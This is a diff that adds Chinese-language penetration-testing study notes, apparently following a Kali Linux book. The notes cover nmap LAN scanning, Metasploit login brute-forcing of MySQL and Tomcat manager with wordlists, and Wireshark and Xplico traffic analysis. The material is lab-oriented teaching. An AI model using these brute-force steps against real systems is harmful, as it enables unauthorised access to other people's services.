@@ -33,21 +33,67 @@
 第一章、Linux安全渗透简介
 第二章、配置kali linux
 第三章、高级测试实验室
-    3.1.
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+第四章、信息收集
+    4.1. 局域网内扫描
+        nmap -A 192.168.1.1-254
+第五章、漏洞扫描
+第六章、漏洞利用
+    6.1. 渗透攻击mysql
+        6.1.1. 启动msfconsole
+            msfconsole
+        6.1.2. 扫描mysql模块
+            search mysql
+        6.1.3. 使用mysql扫描模块
+            use auxiliary/scanner/mysql/mysql_login
+        6.1.4. 显示mysql扫描模块的有效选项
+            show options
+        6.1.5. 指定攻击目标系统
+            set RHOSTS 192/168.1.124
+            set user_file /root/Desktop/usernames.txt
+            set pass_file /root/Desktop/passwords.txt
+        6.1.6. 启动渗透攻击
+            exploit
+    6.2. 渗透攻击tomcat
+        6.2.1. 启动msfconsole
+            msfconsole
+        6.2.2. 扫描tomcat模块
+            search tomcat
+        6.2.3. 使用tomcat管理登录模块进行渗透攻击
+            use auxiliary/scanner/http/tomcat_mgr_login
+        6.2.4. 查看tomcat模块有效选项
+            show options
+        6.2.5. 选择pass_file选项
+            set PASS_FILE /usr/share/metasploit-framework/data/worldlists/tomcat_mgr_default_pass.txt
+        6.2.6. 设置user_file选项
+            set USER_FILE /usr/share/metasploit-framework/data/worldlists/tomcat_mgr_default_users.txt
+        6.2.7. 设置攻击目标IP
+            set RHOSTS 192.168.1.124
+        6.2.8. 设置攻击目标PORT
+            set RPORT 8080
+        6.2.9. 开始渗透攻击
+            exploit
+    6.3. 解析wireshark中数据
+        6.3.1. 启动wireshark
+            wireshark &
+        6.3.2. 查看FTP会话
+            filter过滤条件为：ftp
+            右键任意一行follow tcp stream
+        6.3.3. 安装Xplico工具
+            apt-get install -y xplico
+        6.3.4. 启动apache
+            service apache2 start
+        6.3.5. 启动xplico
+            service xplico start
+        6.3.6. 登录xplico (xplico/xplico)
+            http://localhost:9876
+        6.3.7. 创建会话
+            点击new case
+            选择uploading pcap capture file/s
+            点击sessions 创建session name
+            进入新创建的session会话中
+            upload捕获的pcap文件
+            点击site
+第七章、权限提升
                         </code>
                     </pre>
                 </figure>
